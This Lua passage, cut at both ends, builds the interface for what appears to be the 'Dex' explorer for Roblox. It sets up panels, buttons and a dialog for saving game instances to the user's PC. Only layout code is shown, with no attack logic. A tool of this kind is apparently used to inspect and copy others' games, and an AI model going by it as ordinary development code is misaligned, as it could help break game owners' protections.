local NewGuiPart118 = Instance.new("TextButton")
local NewGuiPart119 = Instance.new("TextLabel")
local NewGuiPart120 = Instance.new("TextLabel")
local NewGuiPart121 = Instance.new("Frame")
local NewGuiPart122 = Instance.new("TextLabel")
local NewGuiPart123 = Instance.new("TextLabel")
local NewGuiPart124 = Instance.new("TextButton")
local NewGuiPart125 = Instance.new("TextLabel")
local NewGuiPart126 = Instance.new("TextLabel")
local NewGuiPart127 = Instance.new("Frame")
local NewGuiPart128 = Instance.new("TextLabel")
local NewGuiPart129 = Instance.new("TextLabel")
local NewGuiPart130 = Instance.new("TextButton")
local NewGuiPart131 = Instance.new("TextLabel")
local NewGuiPart132 = Instance.new("TextLabel")
local NewGuiPart133 = Instance.new("Frame")
local NewGuiPart134 = Instance.new("TextLabel")
local NewGuiPart135 = Instance.new("TextLabel")
local NewGuiPart136 = Instance.new("TextButton")
local NewGuiPart137 = Instance.new("TextLabel")
local NewGuiPart138 = Instance.new("TextLabel")
local NewGuiPart139 = Instance.new("TextLabel")
local NewGuiPart140 = Instance.new("Frame")
local NewGuiPart141 = Instance.new("Frame")
local NewGuiPart142 = Instance.new("TextLabel")
local NewGuiPart143 = Instance.new("TextButton")
local NewGuiPart144 = Instance.new("TextBox")
local NewGuiPart145 = Instance.new("Frame")
local NewGuiPart146 = Instance.new("TextButton")
local NewGuiPart147 = Instance.new("TextLabel")
local NewGuiPart148 = Instance.new("TextLabel")
local NewGuiPart149 = Instance.new("Frame")
local NewGuiPart150 = Instance.new("Frame")
local NewGuiPart151 = Instance.new("TextLabel")
local NewGuiPart152 = Instance.new("TextLabel")
local NewGuiPart153 = Instance.new("BindableFunction")
local NewGuiPart154 = Instance.new("BindableFunction")
local NewGuiPart155 = Instance.new("BindableFunction")
local NewGuiPart156 = Instance.new("BindableFunction")
local NewGuiPart157 = Instance.new("BindableEvent")
local NewGuiPart158 = Instance.new("BindableFunction")
local NewGuiPart159 = Instance.new("BindableFunction")
local NewGuiPart160 = Instance.new("BindableEvent")
local NewGuiPart161 = Instance.new("BindableFunction")
local NewGuiPart162 = Instance.new("BindableFunction")
local NewGuiPart163 = Instance.new("BindableEvent")
-- Properties

NewGuiPart1.Name = "Dex"

NewGuiPart2.Name = "PropertiesFrame"
NewGuiPart2.Parent = NewGuiPart1
NewGuiPart2.Active = true
NewGuiPart2.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart2.BackgroundTransparency = 0.10000000149012
NewGuiPart2.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart2.Position = UDim2.new(1, 0, 0.5, 36)
NewGuiPart2.Size = UDim2.new(0, 300, 0.5, -36)

NewGuiPart158.Name = "GetApi"
NewGuiPart158.Parent = NewGuiPart2
NewGuiPart158.Archivable = true

NewGuiPart159.Name = "GetAwaiting"
NewGuiPart159.Parent = NewGuiPart2
NewGuiPart159.Archivable = true

NewGuiPart160.Name = "SetAwaiting"
NewGuiPart160.Parent = NewGuiPart2
NewGuiPart160.Archivable = true

NewGuiPart3.Name = "Header"
NewGuiPart3.Parent = NewGuiPart2
NewGuiPart3.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart3.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart3.Position = UDim2.new(0, 0, 0, -36)
NewGuiPart3.Size = UDim2.new(1, 0, 0, 35)

NewGuiPart4.Parent = NewGuiPart3
NewGuiPart4.BackgroundTransparency = 1
NewGuiPart4.Position = UDim2.new(0, 4, 0, 0)
NewGuiPart4.Size = UDim2.new(1, -4, 0.5, 0)
NewGuiPart4.Font = Enum.Font.SourceSans
NewGuiPart4.FontSize = Enum.FontSize.Size14
NewGuiPart4.Text = "Properties"
NewGuiPart4.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart4.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart5.Parent = NewGuiPart3
NewGuiPart5.BackgroundTransparency = 0.80000001192093
NewGuiPart5.Position = UDim2.new(0, 4, 0.5, 0)
NewGuiPart5.Size = UDim2.new(1, -8, 0.5, -3)
NewGuiPart5.Font = Enum.Font.SourceSans
NewGuiPart5.FontSize = Enum.FontSize.Size14
NewGuiPart5.Text = "Search Properties"
--NewGuiPart5.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart5.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart6.Name = "ExplorerPanel"
NewGuiPart6.Parent = NewGuiPart1
NewGuiPart6.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart6.BackgroundTransparency = 0.10000000149012
NewGuiPart6.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart6.Position = UDim2.new(1, 0, 0, 0)
NewGuiPart6.Size = UDim2.new(0, 300, 0.5, 0)

NewGuiPart153.Name = "GetOption"
NewGuiPart153.Parent = NewGuiPart6
NewGuiPart153.Archivable = true

NewGuiPart154.Name = "GetSelection"
NewGuiPart154.Parent = NewGuiPart6
NewGuiPart154.Archivable = true

NewGuiPart155.Name = "SetOption"
NewGuiPart155.Parent = NewGuiPart6
NewGuiPart155.Archivable = true

NewGuiPart156.Name = "SetSelection"
NewGuiPart156.Parent = NewGuiPart6
NewGuiPart156.Archivable = true

NewGuiPart157.Name = "SelectionChanged"
NewGuiPart157.Parent = NewGuiPart6
NewGuiPart157.Archivable = true

NewGuiPart7.Name = "SideMenu"
NewGuiPart7.Parent = NewGuiPart1
NewGuiPart7.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart7.BackgroundTransparency = 1
NewGuiPart7.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart7.BorderSizePixel = 0
NewGuiPart7.Position = UDim2.new(1, -330, 0, 0)
NewGuiPart7.Size = UDim2.new(0, 30, 0, 180)
NewGuiPart7.Visible = false
NewGuiPart7.ZIndex = 2

NewGuiPart8.Name = "Toggle"
NewGuiPart8.Parent = NewGuiPart7
NewGuiPart8.Active = false
NewGuiPart8.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart8.BorderSizePixel = 0
NewGuiPart8.Position = UDim2.new(0, 0, 0, 60)
NewGuiPart8.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart8.AutoButtonColor = false
NewGuiPart8.Font = Enum.Font.SourceSans
NewGuiPart8.FontSize = Enum.FontSize.Size24
NewGuiPart8.Text = ">"
NewGuiPart8.TextTransparency = 1
NewGuiPart8.TextWrapped = true

NewGuiPart9.Name = "Title"
NewGuiPart9.Parent = NewGuiPart7
NewGuiPart9.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart9.BackgroundTransparency = 1
NewGuiPart9.Size = UDim2.new(0, 30, 0, 20)
NewGuiPart9.ZIndex = 2
NewGuiPart9.Font = Enum.Font.SourceSansBold
NewGuiPart9.FontSize = Enum.FontSize.Size14
NewGuiPart9.Text = "DEX"
NewGuiPart9.TextWrapped = true

NewGuiPart10.Name = "Version"
NewGuiPart10.Parent = NewGuiPart7
NewGuiPart10.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart10.BackgroundTransparency = 1
NewGuiPart10.Position = UDim2.new(0, 0, 0, 15)
NewGuiPart10.Size = UDim2.new(0, 30, 0, 20)
NewGuiPart10.ZIndex = 2
NewGuiPart10.Font = Enum.Font.SourceSansBold
NewGuiPart10.FontSize = Enum.FontSize.Size12
NewGuiPart10.Text = "V2.0.0"
NewGuiPart10.TextWrapped = true

NewGuiPart11.Name = "Slant"
NewGuiPart11.Parent = NewGuiPart7
NewGuiPart11.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart11.BackgroundTransparency = 1
NewGuiPart11.Position = UDim2.new(0, 0, 0, 90)
NewGuiPart11.Rotation = 180
NewGuiPart11.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart11.Image = "rbxassetid://474172996"
NewGuiPart11.ImageColor3 = Color3.new(0.913726, 0.913726, 0.913726)

NewGuiPart12.Name = "Main"
NewGuiPart12.Parent = NewGuiPart7
NewGuiPart12.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart12.BorderSizePixel = 0
NewGuiPart12.Size = UDim2.new(0, 30, 0, 30)

NewGuiPart13.Name = "SlideOut"
NewGuiPart13.Parent = NewGuiPart7
NewGuiPart13.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
NewGuiPart13.BackgroundTransparency = 1
NewGuiPart13.BorderSizePixel = 0
NewGuiPart13.ClipsDescendants = true
NewGuiPart13.Position = UDim2.new(0, 0, 0, 30)
NewGuiPart13.Size = UDim2.new(0, 30, 0, 150)

NewGuiPart14.Name = "SlideFrame"
NewGuiPart14.Parent = NewGuiPart13
NewGuiPart14.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
NewGuiPart14.BorderSizePixel = 0
NewGuiPart14.Position = UDim2.new(0, 0, 0, -150)
NewGuiPart14.Size = UDim2.new(0, 30, 0, 150)

NewGuiPart15.Name = "Explorer"
NewGuiPart15.Parent = NewGuiPart14
NewGuiPart15.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart15.BackgroundTransparency = 1
NewGuiPart15.BorderSizePixel = 0
NewGuiPart15.Position = UDim2.new(0, 0, 0, 120)
NewGuiPart15.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart15.ZIndex = 2
NewGuiPart15.AutoButtonColor = false
NewGuiPart15.Font = Enum.Font.SourceSans
NewGuiPart15.FontSize = Enum.FontSize.Size24
NewGuiPart15.Text = ""

NewGuiPart16.Name = "Icon"
NewGuiPart16.Parent = NewGuiPart15
NewGuiPart16.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart16.BackgroundTransparency = 1
NewGuiPart16.Position = UDim2.new(0, 5, 0, 5)
NewGuiPart16.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart16.ZIndex = 2
NewGuiPart16.Image = "rbxassetid://472635937"
NewGuiPart16.ImageColor3 = Color3.new(0.27451, 0.27451, 0.27451)

NewGuiPart17.Name = "SaveMap"
NewGuiPart17.Parent = NewGuiPart14
NewGuiPart17.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart17.BackgroundTransparency = 1
NewGuiPart17.BorderSizePixel = 0
NewGuiPart17.Position = UDim2.new(0, 0, 0, 90)
NewGuiPart17.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart17.ZIndex = 2
NewGuiPart17.AutoButtonColor = false
NewGuiPart17.Font = Enum.Font.SourceSans
NewGuiPart17.FontSize = Enum.FontSize.Size24
NewGuiPart17.Text = ""

NewGuiPart18.Name = "Icon"
NewGuiPart18.Parent = NewGuiPart17
NewGuiPart18.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart18.BackgroundTransparency = 1
NewGuiPart18.Position = UDim2.new(0, 5, 0, 5)
NewGuiPart18.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart18.ZIndex = 2
NewGuiPart18.Image = "rbxassetid://472636337"
NewGuiPart18.ImageColor3 = Color3.new(0.27451, 0.27451, 0.27451)

NewGuiPart19.Name = "Settings"
NewGuiPart19.Parent = NewGuiPart14
NewGuiPart19.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart19.BackgroundTransparency = 1
NewGuiPart19.BorderSizePixel = 0
NewGuiPart19.Position = UDim2.new(0, 0, 0, 30)
NewGuiPart19.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart19.ZIndex = 2
NewGuiPart19.AutoButtonColor = false
NewGuiPart19.Font = Enum.Font.SourceSans
NewGuiPart19.FontSize = Enum.FontSize.Size24
NewGuiPart19.Text = ""

NewGuiPart20.Name = "Icon"
NewGuiPart20.Parent = NewGuiPart19
NewGuiPart20.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart20.BackgroundTransparency = 1
NewGuiPart20.Position = UDim2.new(0, 5, 0, 5)
NewGuiPart20.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart20.ZIndex = 2
NewGuiPart20.Image = "rbxassetid://472635774"
NewGuiPart20.ImageColor3 = Color3.new(0.27451, 0.27451, 0.27451)

NewGuiPart21.Name = "Remotes"
NewGuiPart21.Parent = NewGuiPart14
NewGuiPart21.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart21.BackgroundTransparency = 1
NewGuiPart21.BorderSizePixel = 0
NewGuiPart21.Position = UDim2.new(0, 0, 0, 60)
NewGuiPart21.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart21.ZIndex = 2
NewGuiPart21.AutoButtonColor = false
NewGuiPart21.Font = Enum.Font.SourceSans
NewGuiPart21.FontSize = Enum.FontSize.Size24
NewGuiPart21.Text = ""

NewGuiPart22.Name = "Icon"
NewGuiPart22.Parent = NewGuiPart21
NewGuiPart22.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart22.BackgroundTransparency = 1
NewGuiPart22.Position = UDim2.new(0, 5, 0, 5)
NewGuiPart22.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart22.ZIndex = 2
NewGuiPart22.Image = "rbxassetid://472636187"
NewGuiPart22.ImageColor3 = Color3.new(0.27451, 0.27451, 0.27451)

NewGuiPart23.Name = "About"
NewGuiPart23.Parent = NewGuiPart14
NewGuiPart23.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart23.BackgroundTransparency = 1
NewGuiPart23.BorderSizePixel = 0
NewGuiPart23.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart23.ZIndex = 2
NewGuiPart23.AutoButtonColor = false
NewGuiPart23.Font = Enum.Font.SourceSans
NewGuiPart23.FontSize = Enum.FontSize.Size24
NewGuiPart23.Text = ""

NewGuiPart24.Name = "Icon"
NewGuiPart24.Parent = NewGuiPart23
NewGuiPart24.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart24.BackgroundTransparency = 1
NewGuiPart24.Position = UDim2.new(0, 5, 0, 5)
NewGuiPart24.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart24.ZIndex = 2
NewGuiPart24.Image = "rbxassetid://476354004"
NewGuiPart24.ImageColor3 = Color3.new(0.27451, 0.27451, 0.27451)

NewGuiPart25.Name = "OpenScriptEditor"
NewGuiPart25.Parent = NewGuiPart7
NewGuiPart25.Active = false
NewGuiPart25.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart25.BorderSizePixel = 0
NewGuiPart25.Position = UDim2.new(0, 0, 0, 30)
NewGuiPart25.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart25.ZIndex = 2
NewGuiPart25.AutoButtonColor = false
NewGuiPart25.Font = Enum.Font.SourceSans
NewGuiPart25.FontSize = Enum.FontSize.Size24
NewGuiPart25.Text = ""

NewGuiPart26.Name = "Icon"
NewGuiPart26.Parent = NewGuiPart25
NewGuiPart26.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart26.BackgroundTransparency = 1
NewGuiPart26.Position = UDim2.new(0, 5, 0, 5)
NewGuiPart26.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart26.ZIndex = 2
NewGuiPart26.Image = "rbxassetid://475456048"
NewGuiPart26.ImageColor3 = Color3.new(0.105882, 0.164706, 0.207843)
NewGuiPart26.ImageTransparency = 1

NewGuiPart27.Name = "Toggle"
NewGuiPart27.Parent = NewGuiPart1
NewGuiPart27.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart27.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart27.Position = UDim2.new(1, 0, 0, 0)
NewGuiPart27.Size = UDim2.new(0, 30, 0, 30)
NewGuiPart27.Font = Enum.Font.SourceSans
NewGuiPart27.FontSize = Enum.FontSize.Size24
NewGuiPart27.Text = "<"

NewGuiPart28.Name = "SettingsPanel"
NewGuiPart28.Parent = NewGuiPart1
NewGuiPart28.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart28.BackgroundTransparency = 0.10000000149012
NewGuiPart28.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart28.Position = UDim2.new(1, 0, 0, 0)
NewGuiPart28.Size = UDim2.new(0, 300, 1, 0)

NewGuiPart162.Name = "GetSetting"
NewGuiPart162.Parent = NewGuiPart28
NewGuiPart162.Archivable = true

NewGuiPart29.Name = "Header"
NewGuiPart29.Parent = NewGuiPart28
NewGuiPart29.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart29.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart29.Size = UDim2.new(1, 0, 0, 17)

NewGuiPart30.Parent = NewGuiPart29
NewGuiPart30.BackgroundTransparency = 1
NewGuiPart30.Position = UDim2.new(0, 4, 0, 0)
NewGuiPart30.Size = UDim2.new(1, -4, 1, 0)
NewGuiPart30.Font = Enum.Font.SourceSans
NewGuiPart30.FontSize = Enum.FontSize.Size14
NewGuiPart30.Text = "Settings"
NewGuiPart30.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart30.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart31.Name = "SettingTemplate"
NewGuiPart31.Parent = NewGuiPart28
NewGuiPart31.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart31.BackgroundTransparency = 1
NewGuiPart31.Position = UDim2.new(0, 0, 0, 18)
NewGuiPart31.Size = UDim2.new(1, 0, 0, 60)
NewGuiPart31.Visible = false

NewGuiPart32.Name = "SName"
NewGuiPart32.Parent = NewGuiPart31
NewGuiPart32.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart32.BackgroundTransparency = 1
NewGuiPart32.Position = UDim2.new(0, 10, 0, 0)
NewGuiPart32.Size = UDim2.new(1, -20, 0, 30)
NewGuiPart32.Font = Enum.Font.SourceSans
NewGuiPart32.FontSize = Enum.FontSize.Size18
NewGuiPart32.Text = "SettingName"
NewGuiPart32.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart33.Name = "Status"
NewGuiPart33.Parent = NewGuiPart31
NewGuiPart33.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart33.BackgroundTransparency = 1
NewGuiPart33.Position = UDim2.new(0, 60, 0, 30)
NewGuiPart33.Size = UDim2.new(0, 50, 0, 15)
NewGuiPart33.Font = Enum.Font.SourceSans
NewGuiPart33.FontSize = Enum.FontSize.Size18
NewGuiPart33.Text = "Off"
NewGuiPart33.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart34.Name = "Change"
NewGuiPart34.Parent = NewGuiPart31
NewGuiPart34.BackgroundColor3 = Color3.new(0.862745, 0.862745, 0.862745)
NewGuiPart34.BorderSizePixel = 0
NewGuiPart34.Position = UDim2.new(0, 10, 0, 30)
NewGuiPart34.Size = UDim2.new(0, 40, 0, 15)
NewGuiPart34.Font = Enum.Font.SourceSans
NewGuiPart34.FontSize = Enum.FontSize.Size14
NewGuiPart34.Text = ""

NewGuiPart35.Name = "OnBar"
NewGuiPart35.Parent = NewGuiPart34
NewGuiPart35.BackgroundColor3 = Color3.new(0, 0.576471, 0.862745)
NewGuiPart35.BorderSizePixel = 0
NewGuiPart35.Size = UDim2.new(0, 0, 0, 15)
NewGuiPart35.Font = Enum.Font.SourceSans
NewGuiPart35.FontSize = Enum.FontSize.Size14
NewGuiPart35.Text = ""

NewGuiPart36.Name = "Bar"
NewGuiPart36.Parent = NewGuiPart34
NewGuiPart36.BackgroundColor3 = Color3.new(0, 0, 0)
NewGuiPart36.BorderSizePixel = 0
NewGuiPart36.ClipsDescendants = true
NewGuiPart36.Position = UDim2.new(0, -2, 0, -2)
NewGuiPart36.Size = UDim2.new(0, 10, 0, 19)
NewGuiPart36.Font = Enum.Font.SourceSans
NewGuiPart36.FontSize = Enum.FontSize.Size14
NewGuiPart36.Text = ""

NewGuiPart37.Name = "SettingList"
NewGuiPart37.Parent = NewGuiPart28
NewGuiPart37.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart37.BackgroundTransparency = 1
NewGuiPart37.Position = UDim2.new(0, 0, 0, 17)
NewGuiPart37.Size = UDim2.new(1, 0, 1, -17)

NewGuiPart38.Name = "SaveInstance"
NewGuiPart38.Parent = NewGuiPart1
NewGuiPart38.Active = true
NewGuiPart38.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart38.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart38.Draggable = true
NewGuiPart38.Position = UDim2.new(0.300000012, 0, 0.300000012, 0)
NewGuiPart38.Size = UDim2.new(0, 350, 0, 20)
NewGuiPart38.Visible = false
NewGuiPart38.ZIndex = 2

NewGuiPart39.Name = "Title"
NewGuiPart39.Parent = NewGuiPart38
NewGuiPart39.BackgroundTransparency = 1
NewGuiPart39.Size = UDim2.new(1, 0, 1, 0)
NewGuiPart39.ZIndex = 2
NewGuiPart39.Font = Enum.Font.SourceSans
NewGuiPart39.FontSize = Enum.FontSize.Size14
NewGuiPart39.Text = "Save Instance"
NewGuiPart39.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart39.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart40.Name = "MainWindow"
NewGuiPart40.Parent = NewGuiPart38
NewGuiPart40.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart40.BackgroundTransparency = 0.10000000149012
NewGuiPart40.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart40.Size = UDim2.new(1, 0, 0, 200)

NewGuiPart41.Name = "Save"
NewGuiPart41.Parent = NewGuiPart40
NewGuiPart41.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart41.BackgroundTransparency = 0.5
NewGuiPart41.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart41.Position = UDim2.new(0.075000003, 0, 1, -40)
NewGuiPart41.Size = UDim2.new(0.400000006, 0, 0, 30)
NewGuiPart41.Font = Enum.Font.SourceSans
NewGuiPart41.FontSize = Enum.FontSize.Size18
NewGuiPart41.Text = "Save"

NewGuiPart42.Name = "Desc"
NewGuiPart42.Parent = NewGuiPart40
NewGuiPart42.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart42.BackgroundTransparency = 1
NewGuiPart42.Position = UDim2.new(0, 0, 0, 20)
NewGuiPart42.Size = UDim2.new(1, 0, 0, 40)
NewGuiPart42.Font = Enum.Font.SourceSans
NewGuiPart42.FontSize = Enum.FontSize.Size14
NewGuiPart42.Text = "This will save an instance to your PC. Type in the name for your instance. (.rbxmx will be added automatically.)"
NewGuiPart42.TextWrapped = true

NewGuiPart43.Name = "Cancel"
NewGuiPart43.Parent = NewGuiPart40
NewGuiPart43.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart43.BackgroundTransparency = 0.5
NewGuiPart43.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart43.Position = UDim2.new(0.524999976, 0, 1, -40)
NewGuiPart43.Size = UDim2.new(0.400000006, 0, 0, 30)
NewGuiPart43.Font = Enum.Font.SourceSans
NewGuiPart43.FontSize = Enum.FontSize.Size18
NewGuiPart43.Text = "Cancel"

NewGuiPart44.Name = "FileName"
NewGuiPart44.Parent = NewGuiPart40
NewGuiPart44.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart44.BackgroundTransparency = 0.20000000298023
NewGuiPart44.Position = UDim2.new(0.075000003, 0, 0.400000006, 0)
NewGuiPart44.Size = UDim2.new(0.850000024, 0, 0, 30)
NewGuiPart44.Font = Enum.Font.SourceSans
NewGuiPart44.FontSize = Enum.FontSize.Size18
NewGuiPart44.Text = ""
NewGuiPart44.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart45.Name = "SaveObjects"
NewGuiPart45.Parent = NewGuiPart40
NewGuiPart45.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart45.BackgroundTransparency = 0.60000002384186
NewGuiPart45.Position = UDim2.new(0.075000003, 0, 0.625, 0)
NewGuiPart45.Size = UDim2.new(0, 20, 0, 20)
NewGuiPart45.ZIndex = 2
NewGuiPart45.Font = Enum.Font.SourceSans
NewGuiPart45.FontSize = Enum.FontSize.Size18
NewGuiPart45.Text = ""
NewGuiPart45.TextColor3 = Color3.new(1, 1, 1)

NewGuiPart46.Name = "enabled"
NewGuiPart46.Parent = NewGuiPart45
NewGuiPart46.BackgroundColor3 = Color3.new(0.380392, 0.380392, 0.380392)
NewGuiPart46.BackgroundTransparency = 0.40000000596046
NewGuiPart46.BorderSizePixel = 0
NewGuiPart46.Position = UDim2.new(0, 3, 0, 3)
NewGuiPart46.Size = UDim2.new(0, 14, 0, 14)
NewGuiPart46.Font = Enum.Font.SourceSans
NewGuiPart46.FontSize = Enum.FontSize.Size14
NewGuiPart46.Text = ""

NewGuiPart47.Name = "Desc2"
NewGuiPart47.Parent = NewGuiPart40
NewGuiPart47.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart47.BackgroundTransparency = 1
NewGuiPart47.Position = UDim2.new(0.075000003, 30, 0.625, 0)
NewGuiPart47.Size = UDim2.new(0.925000012, -30, 0, 20)
NewGuiPart47.Font = Enum.Font.SourceSans
NewGuiPart47.FontSize = Enum.FontSize.Size14
NewGuiPart47.Text = "Save \"Object\" type values"
NewGuiPart47.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart48.Name = "Confirmation"
NewGuiPart48.Parent = NewGuiPart1
NewGuiPart48.Active = true
NewGuiPart48.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart48.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart48.Draggable = true
NewGuiPart48.Position = UDim2.new(0.300000012, 0, 0.349999994, 0)
NewGuiPart48.Size = UDim2.new(0, 350, 0, 20)
NewGuiPart48.Visible = false
NewGuiPart48.ZIndex = 3

NewGuiPart49.Name = "Title"
NewGuiPart49.Parent = NewGuiPart48
NewGuiPart49.BackgroundTransparency = 1
NewGuiPart49.Size = UDim2.new(1, 0, 1, 0)
NewGuiPart49.ZIndex = 3
NewGuiPart49.Font = Enum.Font.SourceSans
NewGuiPart49.FontSize = Enum.FontSize.Size14
NewGuiPart49.Text = "Confirm"
NewGuiPart49.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart49.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart50.Name = "MainWindow"
NewGuiPart50.Parent = NewGuiPart48
NewGuiPart50.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart50.BackgroundTransparency = 0.10000000149012
NewGuiPart50.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart50.Size = UDim2.new(1, 0, 0, 150)
NewGuiPart50.ZIndex = 2

NewGuiPart51.Name = "Yes"
NewGuiPart51.Parent = NewGuiPart50
NewGuiPart51.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart51.BackgroundTransparency = 0.5
NewGuiPart51.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart51.Position = UDim2.new(0.075000003, 0, 1, -40)
NewGuiPart51.Size = UDim2.new(0.400000006, 0, 0, 30)
NewGuiPart51.ZIndex = 2
NewGuiPart51.Font = Enum.Font.SourceSans
NewGuiPart51.FontSize = Enum.FontSize.Size18
NewGuiPart51.Text = "Yes"

NewGuiPart52.Name = "Desc"
NewGuiPart52.Parent = NewGuiPart50
NewGuiPart52.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart52.BackgroundTransparency = 1
NewGuiPart52.Position = UDim2.new(0, 0, 0, 20)
NewGuiPart52.Size = UDim2.new(1, 0, 0, 40)
NewGuiPart52.ZIndex = 2
NewGuiPart52.Font = Enum.Font.SourceSans
NewGuiPart52.FontSize = Enum.FontSize.Size14
NewGuiPart52.Text = "The file, FILENAME, already exists. Overwrite?"
NewGuiPart52.TextWrapped = true

NewGuiPart53.Name = "No"
NewGuiPart53.Parent = NewGuiPart50
NewGuiPart53.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart53.BackgroundTransparency = 0.5
NewGuiPart53.BorderColor3 = Color3.new(0, 0, 0)
NewGuiPart53.Position = UDim2.new(0.524999976, 0, 1, -40)
NewGuiPart53.Size = UDim2.new(0.400000006, 0, 0, 30)
NewGuiPart53.ZIndex = 2
NewGuiPart53.Font = Enum.Font.SourceSans
NewGuiPart53.FontSize = Enum.FontSize.Size18
NewGuiPart53.Text = "No"

NewGuiPart54.Name = "Caution"
NewGuiPart54.Parent = NewGuiPart1
NewGuiPart54.Active = true
NewGuiPart54.BackgroundColor3 = Color3.new(0.913726, 0.913726, 0.913726)
NewGuiPart54.BorderColor3 = Color3.new(0.584314, 0.584314, 0.584314)
NewGuiPart54.Draggable = true
NewGuiPart54.Position = UDim2.new(0.300000012, 0, 0.300000012, 0)
NewGuiPart54.Size = UDim2.new(0, 350, 0, 20)
NewGuiPart54.Visible = false
NewGuiPart54.ZIndex = 5

NewGuiPart55.Name = "Title"
NewGuiPart55.Parent = NewGuiPart54
NewGuiPart55.BackgroundTransparency = 1
NewGuiPart55.Size = UDim2.new(1, 0, 1, 0)
NewGuiPart55.ZIndex = 5
NewGuiPart55.Font = Enum.Font.SourceSans
NewGuiPart55.FontSize = Enum.FontSize.Size14
NewGuiPart55.Text = "Caution"
NewGuiPart55.TextColor3 = Color3.new(0, 0, 0)
NewGuiPart55.TextXAlignment = Enum.TextXAlignment.Left

NewGuiPart56.Name = "MainWindow"
NewGuiPart56.Parent = NewGuiPart54
NewGuiPart56.BackgroundColor3 = Color3.new(1, 1, 1)
NewGuiPart56.BackgroundTransparency = 0.10000000149012
NewGuiPart56.BorderColor3 = Color3.new(0.74902, 0.74902, 0.74902)
NewGuiPart56.Size = UDim2.new(1, 0, 0, 150)
NewGuiPart56.ZIndex = 4

NewGuiPart57.Name = "Desc"
